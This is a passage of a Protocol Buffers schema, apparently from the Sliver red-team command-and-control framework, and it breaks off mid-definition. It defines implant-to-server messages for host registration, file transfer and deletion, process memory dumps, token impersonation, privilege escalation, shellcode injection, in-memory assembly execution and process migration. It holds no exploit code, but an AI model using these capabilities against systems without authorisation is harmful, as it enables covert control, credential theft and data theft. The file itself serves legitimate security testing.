syntax = "proto3";
package sliverpb;
option go_package = "github.com/bishopfox/sliver/protobuf/sliverpb";

import "commonpb/common.proto";

/*
  
  >>> Reserved Numbers <<<

    For tunnel messages:
      uint64 TunnelID = 8 [jstype = JS_STRING]; // JS can't represent a uint64
      uint32 SessionID = 9;

    For request/response messages:
      Request Request = 9;
      Response Response = 9;
  
    - Request messages should be named with the suffix "Req"

*/

// Envelope - Used to encode implant<->server messages since we 
//            cannot use gRPC due to the various transports used.
message Envelope {
  uint64 ID = 1;   // Envelope ID used to track request/response
  uint32 Type = 2; // Message type
  bytes Data = 3;  // Actual message data

  bool UnknownMessageType = 4; // Set if the implant did not understand the message
}

// Register - First message the implant sends to the server
message Register {
  string Name = 1;
  string Hostname = 2;
  string Uuid = 3;
  string Username = 4;
  string Uid = 5;
  string Gid = 6;
  string Os = 7;
  string Arch = 8;
  int32 Pid = 9;
  string Filename = 10;
  string ActiveC2 = 11;
  string Version = 12;
  uint32 ReconnectInterval = 13;
  string ProxyURL = 14;
}

// Ping - Not ICMP, just sends a rount trip message to an implant to
//        see if it's still responding.
message Ping {
  int32 Nonce = 1;

  // Ping is special
  commonpb.Response Response = 8;
  commonpb.Request Request = 9;
}

// KillSessionReq - Request the implant to kill a session
message KillSessionReq {
  bool Force = 1;

  commonpb.Request Request = 9;
}

// PsReq - Request the implant to list ses of a remote session.
message PsReq {
  commonpb.Request Request = 9;
}

message Ps {
  repeated commonpb.Process Processes = 1;

  commonpb.Response Response = 9;
}

// TerminateReq - Request the implant terminate a remote processes
message TerminateReq {
  int32 Pid = 1;
  bool Force = 2;

  commonpb.Request Request = 9;
}

message Terminate {
  int32 Pid = 1;

  commonpb.Response Response = 9;
}

// IfconfigReq - Request the implant to list network interfaces
message IfconfigReq {
  commonpb.Request Request = 9;
}

message Ifconfig {
  repeated NetInterface NetInterfaces = 1;

  commonpb.Response Response = 9;
}

message NetInterface {
  int32 Index = 1;
  string Name = 2;
  string MAC = 3;
  repeated string IPAddresses = 4;
}

message LsReq {
  string Path = 1;

  commonpb.Request Request = 9;
}

message Ls {
  string Path = 1;
  bool Exists = 2;
  repeated FileInfo Files = 3;

  commonpb.Response Response = 9;
}

message FileInfo {
  string Name = 1;
  bool IsDir = 2;
  int64 Size = 3;
}

message CdReq {
  string Path = 1;
  commonpb.Request Request = 9;
}

message PwdReq {
  commonpb.Request Request = 9;
}

message Pwd {
  string Path = 1;

  commonpb.Response Response = 9;
}

message RmReq {
  string Path = 1;
  bool Recursive = 2;
  bool Force = 3;

  commonpb.Request Request = 9;
}

message Rm {
  string Path = 1;

  commonpb.Response Response = 9;
}

message MkdirReq {
  string Path = 1;

  commonpb.Request Request = 9;
}

message Mkdir {
  string Path = 1;

  commonpb.Response Response = 9;
}

message DownloadReq {
  string Path = 1;

  commonpb.Request Request = 9;
}

message Download {
  string Path = 1;
  string Encoder = 2;
  bool Exists = 3;
  bytes Data = 4;

  commonpb.Response Response = 9;
}

message UploadReq {
  string Path = 1;
  string Encoder = 2;
  bytes Data = 3;

  commonpb.Request Request = 9;
}

message Upload {
  string Path = 1;

  commonpb.Response Response = 9;
}

message ProcessDumpReq {
  int32 Pid = 1;
  int32 Timeout = 2;

  commonpb.Request Request = 9;
}

message ProcessDump {
  bytes Data = 1;

  commonpb.Response Response = 9;
}

message RunAsReq {
  string Username = 1;
  string ProcessName = 2;
  string Args = 3;

  commonpb.Request Request = 9;
}

message RunAs {
  string Output = 1;

  commonpb.Response Response = 9;
}

message ImpersonateReq {
  string Username = 1;
  commonpb.Request Request = 9;
}

message Impersonate {
  commonpb.Response Response = 9;
}

message RevToSelfReq {
  commonpb.Request Request = 9;
}

message RevToSelf {
  commonpb.Response Response = 9;
}

// InvokeGetSystemReq - Implant-side version of GetSystemReq, this message
//                      contains the .Data based on the client's req.Config
message InvokeGetSystemReq {
  bytes Data = 1;
  string HostingProcess = 2;

  commonpb.Request Request = 9;
}

// GetSystem - The result of a InvokeGetSystemReq attempt
message GetSystem {

  commonpb.Response Response = 9;
}

message MakeTokenReq {
  string Username = 1;
  string Password = 2;
  string Domain = 3;

  commonpb.Request Request = 9;
}

message MakeToken {
  commonpb.Response Response = 9;
}

message TaskReq {
  string Encoder = 1;
  bool RWXPages = 2;
  uint32 Pid = 3;
  bytes Data = 4;

  commonpb.Request Request = 9;
}

message Task {
  commonpb.Response Response = 9;
}

message ExecuteAssemblyReq {
  bytes Assembly = 1;
  string Arguments = 2;
  string Process = 3;
  bool IsDLL = 4;
  string Arch = 5;
  string ClassName = 6;
  string Method = 7;
  string AppDomain = 8;
  commonpb.Request Request = 9;
}

message InvokeExecuteAssemblyReq {
  bytes Data = 1;
  string process = 2;

  commonpb.Request Request = 9;
}

message ExecuteAssembly {
  bytes Output = 1;

  commonpb.Response Response = 9;
}

message InvokeMigrateReq {
  uint32 Pid = 1;
  bytes Data = 2;

  commonpb.Request Request = 9;
}

message Migrate {
  bool Success = 1;

  commonpb.Response Response = 9;
}

message ExecuteReq {
  string Path = 1;
  repeated string Args = 2;
  bool Output = 3;

  commonpb.Request Request = 9;
}

message ExecuteTokenReq {
  string Path = 1;
  repeated string Args = 2;
  bool Output = 3;

  commonpb.Request Request = 9;
}

message Execute {
